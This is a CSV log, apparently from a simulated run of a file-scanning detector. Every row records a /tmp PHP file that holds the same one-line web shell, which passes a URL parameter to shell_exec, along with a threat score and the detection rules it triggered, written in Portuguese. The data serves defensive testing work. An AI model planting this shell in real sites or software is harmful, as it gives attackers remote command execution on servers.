id,agent_id,hostname,file_path,file_hash_sha256,file_content,threat_score,analysis_findings,is_whitelisted,quarantined_path,timestamp
910,sim-agent-001,simulador-host,/tmp/simulacao_84885.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:49.873731+00:00
911,sim-agent-001,simulador-host,/tmp/simulacao_92926.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:53.895002+00:00
912,sim-agent-001,simulador-host,/tmp/simulacao_58662.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:02:57.913744+00:00
913,sim-agent-001,simulador-host,/tmp/simulacao_44839.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:01.941844+00:00
914,sim-agent-001,simulador-host,/tmp/simulacao_65994.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:05.963115+00:00
915,sim-agent-001,simulador-host,/tmp/simulacao_83552.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:09.982722+00:00
916,sim-agent-001,simulador-host,/tmp/simulacao_26078.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:14.005122+00:00
917,sim-agent-001,simulador-host,/tmp/simulacao_15181.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:18.025939+00:00
918,sim-agent-001,simulador-host,/tmp/simulacao_11747.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:22.052320+00:00
919,sim-agent-001,simulador-host,/tmp/simulacao_10093.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:26.071664+00:00
920,sim-agent-001,simulador-host,/tmp/simulacao_38515.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:30.103578+00:00
921,sim-agent-001,simulador-host,/tmp/simulacao_76836.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:34.125242+00:00
922,sim-agent-001,simulador-host,/tmp/simulacao_53457.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:38.151422+00:00
923,sim-agent-001,simulador-host,/tmp/simulacao_85893.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:42.172873+00:00
924,sim-agent-001,simulador-host,/tmp/simulacao_91241.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:46.192668+00:00
925,sim-agent-001,simulador-host,/tmp/simulacao_49428.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:50.217407+00:00
926,sim-agent-001,simulador-host,/tmp/simulacao_84078.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:54.239083+00:00
927,sim-agent-001,simulador-host,/tmp/simulacao_70965.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:03:58.262960+00:00
928,sim-agent-001,simulador-host,/tmp/simulacao_54180.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:02.284850+00:00
929,sim-agent-001,simulador-host,/tmp/simulacao_94491.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:06.316546+00:00
930,sim-agent-001,simulador-host,/tmp/simulacao_31991.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:10.338142+00:00
931,sim-agent-001,simulador-host,/tmp/simulacao_72698.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:14.357432+00:00
932,sim-agent-001,simulador-host,/tmp/simulacao_96325.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:18.380020+00:00
933,sim-agent-001,simulador-host,/tmp/simulacao_20069.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:22.406199+00:00
934,sim-agent-001,simulador-host,/tmp/simulacao_38335.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:26.425717+00:00
935,sim-agent-001,simulador-host,/tmp/simulacao_43534.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:30.445338+00:00
936,sim-agent-001,simulador-host,/tmp/simulacao_26747.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:34.464211+00:00
937,sim-agent-001,simulador-host,/tmp/simulacao_13873.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:38.499361+00:00
938,sim-agent-001,simulador-host,/tmp/simulacao_79690.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:42.526004+00:00
939,sim-agent-001,simulador-host,/tmp/simulacao_49883.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:46.550370+00:00
940,sim-agent-001,simulador-host,/tmp/simulacao_70751.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:50.569748+00:00
941,sim-agent-001,simulador-host,/tmp/simulacao_74964.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:54.590919+00:00
942,sim-agent-001,simulador-host,/tmp/simulacao_54306.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:04:58.614339+00:00
943,sim-agent-001,simulador-host,/tmp/simulacao_16378.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:02.636101+00:00
944,sim-agent-001,simulador-host,/tmp/simulacao_81977.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:06.667819+00:00
945,sim-agent-001,simulador-host,/tmp/simulacao_99028.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:10.688402+00:00
946,sim-agent-001,simulador-host,/tmp/simulacao_8780.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:14.716079+00:00
947,sim-agent-001,simulador-host,/tmp/simulacao_83332.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:18.736466+00:00
948,sim-agent-001,simulador-host,/tmp/simulacao_69253.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:22.760274+00:00
949,sim-agent-001,simulador-host,/tmp/simulacao_86152.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:26.781044+00:00
950,sim-agent-001,simulador-host,/tmp/simulacao_63034.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:30.800477+00:00
951,sim-agent-001,simulador-host,/tmp/simulacao_10204.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:34.825656+00:00
952,sim-agent-001,simulador-host,/tmp/simulacao_23232.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:38.849934+00:00
953,sim-agent-001,simulador-host,/tmp/simulacao_64110.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:42.870329+00:00
954,sim-agent-001,simulador-host,/tmp/simulacao_98058.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:46.893096+00:00
955,sim-agent-001,simulador-host,/tmp/simulacao_88362.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:50.914540+00:00
956,sim-agent-001,simulador-host,/tmp/simulacao_49282.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:54.934424+00:00
957,sim-agent-001,simulador-host,/tmp/simulacao_90330.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:05:58.956223+00:00
958,sim-agent-001,simulador-host,/tmp/simulacao_13622.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:02.978242+00:00
959,sim-agent-001,simulador-host,/tmp/simulacao_96881.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:06.999672+00:00
960,sim-agent-001,simulador-host,/tmp/simulacao_56173.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:11.021044+00:00
961,sim-agent-001,simulador-host,/tmp/simulacao_10494.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:15.040801+00:00
962,sim-agent-001,simulador-host,/tmp/simulacao_56644.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:19.066152+00:00
963,sim-agent-001,simulador-host,/tmp/simulacao_45722.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:23.091178+00:00
964,sim-agent-001,simulador-host,/tmp/simulacao_19398.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:27.115792+00:00
965,sim-agent-001,simulador-host,/tmp/simulacao_82742.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:31.157938+00:00
966,sim-agent-001,simulador-host,/tmp/simulacao_25990.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:35.180104+00:00
967,sim-agent-001,simulador-host,/tmp/simulacao_89496.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:39.208505+00:00
968,sim-agent-001,simulador-host,/tmp/simulacao_55200.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:43.229701+00:00
969,sim-agent-001,simulador-host,/tmp/simulacao_51665.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:47.254824+00:00
970,sim-agent-001,simulador-host,/tmp/simulacao_47127.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:51.277780+00:00
971,sim-agent-001,simulador-host,/tmp/simulacao_17754.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:55.307846+00:00
972,sim-agent-001,simulador-host,/tmp/simulacao_99643.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:06:59.326909+00:00
973,sim-agent-001,simulador-host,/tmp/simulacao_87678.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:07:03.348600+00:00
974,sim-agent-001,simulador-host,/tmp/simulacao_30725.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:07:07.368456+00:00
975,sim-agent-001,simulador-host,/tmp/simulacao_77439.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:07:11.389107+00:00
976,sim-agent-001,simulador-host,/tmp/simulacao_81355.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:07:15.408907+00:00
977,sim-agent-001,simulador-host,/tmp/simulacao_98432.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:07:19.435401+00:00
978,sim-agent-001,simulador-host,/tmp/simulacao_21350.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-30 13:07:23.456495+00:00
